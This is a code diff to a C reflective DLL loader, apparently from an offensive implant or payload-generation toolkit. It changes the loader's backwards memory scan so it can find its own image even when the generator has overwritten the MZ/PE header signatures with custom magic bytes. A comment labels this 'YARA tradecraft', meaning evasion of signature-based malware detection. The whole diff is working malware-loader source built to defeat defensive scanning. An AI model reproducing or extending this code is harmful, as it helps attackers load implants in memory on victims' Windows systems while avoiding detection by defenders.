@@ -323,15 +323,26 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
     /* this function runs FROM the flat copy (the wall is in .text). Scan
      * backwards page-by-page for the MZ/PE that owns us - that is the
      * container's decode buffer, NOT the host EXE (the EXE sits at a
-     * lower address and would only match if we walked past the flat copy). */
+     * lower address and would only match if we walked past the flat copy).
+     *
+     * magic_mz_x64 / magic_pe support (YARA tradecraft): the generator may
+     * patch the image's MZ/PE signatures with custom magic bytes. The
+     * loader stub still starts with the ORIGINAL "MZ  " pattern (the
+     * patchDOSHeaderX64 stub opens with 4D 5A 00 00), so the scan keys on
+     * that stub signature first and validates the candidate by a sane
+     * e_lfanew + a PE header OR a second stub marker at e_lfanew (a
+     * patched image no longer carries IMAGE_NT_SIGNATURE). */
     {
         QWORD pc = (QWORD)(DWORD_PTR)&ReflectiveLoader;
         flat = NULL;
         for (j = 0; j < 4096; j++) {
             unsigned char * page = (unsigned char *)(pc & ~0xFFFULL) - (unsigned long long)j * 0x1000;
-            if (*(WORD *)page == IMAGE_DOS_SIGNATURE) {
-                DWORD lf = *(DWORD *)(page + 0x3C);
-                if (lf < 0x1000 && *(DWORD *)(page + lf) == IMAGE_NT_SIGNATURE) {
+            DWORD lf = *(DWORD *)(page + 0x3C);
+            if (*(DWORD *)page == 0x00005A4DUL            /* MZ   stub signature */
+                && lf >= 0x40 && lf < 0x1000) {
+                DWORD sig = *(DWORD *)(page + lf);
+                if (sig == IMAGE_NT_SIGNATURE              /* unpatched image */
+                    || sig == 0x00005045UL) {              /* "PE  "-stubbed too */
                     flat = page;
                     break;
                 }
